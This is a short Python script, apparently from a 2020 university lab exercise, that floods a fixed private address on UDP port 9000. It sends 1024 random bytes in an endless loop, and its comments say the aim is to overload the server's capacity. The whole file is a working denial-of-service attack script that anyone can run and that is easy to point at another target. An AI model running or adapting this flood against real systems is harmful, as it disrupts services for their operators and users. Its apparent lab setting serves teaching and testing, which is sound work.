#!/usr/bin/env python3

"""
	bot_client.py - UDP client that talks to a remote server on UDP PORT 9000 and sends lots of dummy messages fast
	Author: Zak Ziiaidin (zalkar@bennington.edu)
	Date: 3/30/2020
"""

import socket
import random

# catlab#1
UDP_ADDRESS = '10.10.117.79' 
# exposing port:9000
UDP_PORT = 9000
# generating dummy bytes to overload server's capacity fast
MESSAGE = random._urandom(1024) 

# create a socket -DGRAM == UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# set timeout
sock.settimeout(5)

while 1:
	# send out message to the server - no connect/close needed!
	sock.sendto(MESSAGE, (UDP_ADDRESS, UDP_PORT))

